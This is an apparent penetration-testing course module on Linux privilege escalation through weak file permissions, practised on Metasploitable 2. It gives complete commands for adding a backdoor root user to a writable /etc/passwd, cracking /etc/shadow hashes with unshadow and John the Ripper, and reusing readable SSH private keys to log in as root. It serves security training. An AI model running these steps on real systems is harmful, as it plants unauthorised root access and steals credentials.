# 05 — Weak File Permissions

## Overview

Linux security depends heavily on **file permissions**. When sensitive system files are readable or writable by non-root users, it creates serious security vulnerabilities.

This technique covers three main files:
1. `/etc/passwd` — Writable → Add a root user directly
2. `/etc/shadow` — Readable → Crack password hashes
3. SSH private keys — Readable → Login without password

---

## Part A: Writable /etc/passwd

### What is /etc/passwd?

`/etc/passwd` stores basic user account information. Every user on the system has a line here.

**Normal permissions:**
```
-rw-r--r-- 1 root root /etc/passwd
```
- Root can read and write
- Everyone else can only read

**Vulnerable permissions:**
```
-rw-rw-rw- 1 root root /etc/passwd
```
The extra `w` for group and others means **anyone can write to it**.

---

### Format of /etc/passwd

```
username:password:UID:GID:comment:home_dir:shell
```

**Example line:**
```
root:x:0:0:root:/root:/bin/bash
```

| Field | Value | Meaning |
|-------|-------|---------|
| username | `root` | Username |
| password | `x` | Password is stored in /etc/shadow |
| UID | `0` | User ID — 0 = root |
| GID | `0` | Group ID |
| comment | `root` | Description |
| home_dir | `/root` | Home directory |
| shell | `/bin/bash` | Default shell |

**Key fact:** UID 0 = root. Any user with UID 0 has root privileges, regardless of username.

---

### Step 1: Check if /etc/passwd is writable

```bash
ls -la /etc/passwd
```

Look for `w` in the permissions for group or others.

---

### Step 2: Generate a password hash

You need to create a hashed password (Linux doesn't store plain text passwords):

```bash
openssl passwd -1 -salt hacker password123
```

**Breaking down:**

| Part | Meaning |
|------|---------|
| `openssl passwd` | OpenSSL tool for generating password hashes |
| `-1` | Use MD5 hashing algorithm |
| `-salt hacker` | Salt value (random string added before hashing — use any value) |
| `password123` | The actual password you want |

**Example output:**
```
$1$hacker$TzyKlv0/R/c28R.GAeLw.1
```

This is your hashed password.

---

### Step 3: Add a new root user

```bash
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

**Breaking down:**

| Part | Meaning |
|------|---------|
| `echo '...'` | Print the text |
| `hacker` | New username |
| `$1$hacker$...` | The password hash we generated |
| `0:0` | UID:GID = 0:0 = root level |
| `root` | Comment field |
| `/root` | Home directory |
| `/bin/bash` | Shell |
| `>>` | Append to file (don't overwrite existing users) |

---

### Step 4: Switch to the new root user

```bash
su hacker
# Enter password: password123
```

**Verify:**
```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

You are root.

---

## Part B: Readable /etc/shadow

### What is /etc/shadow?

`/etc/shadow` stores the **actual password hashes** for all users.

**Normal permissions:**
```
-rw-r----- 1 root shadow /etc/shadow
```
Only root and the shadow group can read it. Regular users cannot.

**Vulnerable permissions:**
```
-rw-r--r-- 1 root shadow /etc/shadow
```
The last `r` means everyone can read it.

---

### Step 1: Check if /etc/shadow is readable

```bash
ls -la /etc/shadow
cat /etc/shadow
```

If you can run `cat /etc/shadow` and see content, it's readable.

---

### Step 2: Read the hashes

**Example /etc/shadow content:**
```
root:$6$abc123$LONGHASHHERE...:18000:0:99999:7:::
msfadmin:$6$xyz789$ANOTHERHASHHERE...:18000:0:99999:7:::
```

The second field (between first and second `:`) is the **password hash**.

**Hash format explanation:**
```
$6$abc123$LONGHASHHERE...
 ^  ^
 |  Salt
 Algorithm (6 = SHA-512, 1 = MD5, 2a = bcrypt)
```

---

### Step 3: Copy both /etc/passwd and /etc/shadow to Kali

```bash
# On target — display contents
cat /etc/passwd
cat /etc/shadow
```

Copy these files to your Kali machine.

---

### Step 4: Use `unshadow` to combine them

```bash
unshadow passwd shadow > combined.txt
```

**What this does:** Combines the two files into a format that password crackers can use. `unshadow` is a built-in Kali tool.

---

### Step 5: Crack with John the Ripper

```bash
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Breaking down:**

| Part | Meaning |
|------|---------|
| `john` | John the Ripper — password cracking tool |
| `combined.txt` | The file with combined passwd+shadow |
| `--wordlist=...` | Use a dictionary/wordlist for cracking |
| `rockyou.txt` | Famous wordlist with millions of common passwords |

**Note:** rockyou.txt may be compressed. Decompress first:
```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

**View cracked passwords:**
```bash
john --show combined.txt
```

**Example output:**
```
msfadmin:msfadmin:...
root:toor:...
```

Format: `username:password`

---

### Step 6: Login with cracked password

```bash
su root
# Enter: toor (or whatever was cracked)
```

---

## Part C: Readable SSH Private Keys

### What are SSH keys?

SSH can authenticate using **key pairs** instead of passwords:
- **Private key** — Kept secret, on your machine
- **Public key** — Stored on the server in `~/.ssh/authorized_keys`

If you can read someone's private key, you can log in as them **without knowing their password**.

---

### Step 1: Look for SSH keys

```bash
# Root's SSH directory
ls -la /root/.ssh/

# Other users' SSH directories
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
```

**Breaking down the find commands:**

| Part | Meaning |
|------|---------|
| `find /` | Search entire filesystem |
| `-name "id_rsa"` | Look for file named `id_rsa` (standard private key name) |
| `2>/dev/null` | Hide permission denied errors |

---

### Step 2: Read the private key

```bash
cat /root/.ssh/id_rsa
```

**Normal permissions (secure):**
```
-rw------- 1 root root /root/.ssh/id_rsa
```
Only root can read it.

**Vulnerable permissions:**
```
-rw-r--r-- 1 root root /root/.ssh/id_rsa
```
Anyone can read it.

---

### Step 3: Copy key to Kali and use it

```bash
# On Kali — save the key content to a file
nano root_id_rsa
# Paste the key content

# Set correct permissions (SSH requires private keys to be 600)
chmod 600 root_id_rsa

# Login using the key
ssh -i root_id_rsa root@TARGET_IP
```

**Breaking down the SSH command:**

| Part | Meaning |
|------|---------|
| `ssh` | SSH client |
| `-i root_id_rsa` | Use this identity (private key) file |
| `root@TARGET_IP` | Connect as user `root` to target IP |

---

## Quick Check Commands — All in One

```bash
# Check /etc/passwd writability
ls -la /etc/passwd

# Check /etc/shadow readability
ls -la /etc/shadow

# Check for SSH keys
find / -name "id_rsa" 2>/dev/null
find /home -name "*.pem" 2>/dev/null
ls -la /root/.ssh/ 2>/dev/null
```

---

## Practice on Metasploitable 2

```bash
# After getting initial shell:

# Test 1
ls -la /etc/passwd
ls -la /etc/shadow

# If shadow is readable:
cat /etc/shadow
# Copy to Kali, use unshadow + john

# If passwd is writable:
openssl passwd -1 -salt hacker pass123
echo 'hacker:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

---

## Summary

```
Writable /etc/passwd:
1. ls -la /etc/passwd          → Check if writable
2. openssl passwd -1 -salt ... → Generate hash
3. echo 'user:hash:0:0:...' >> /etc/passwd → Add root user
4. su newuser                  → Become root

Readable /etc/shadow:
1. cat /etc/shadow             → Read hashes
2. unshadow passwd shadow > combined.txt
3. john combined.txt --wordlist=rockyou.txt → Crack
4. su root (with cracked password)

Readable SSH Key:
1. find / -name "id_rsa"       → Find keys
2. cat /root/.ssh/id_rsa       → Read key
3. chmod 600 key + ssh -i key root@target → Login
```
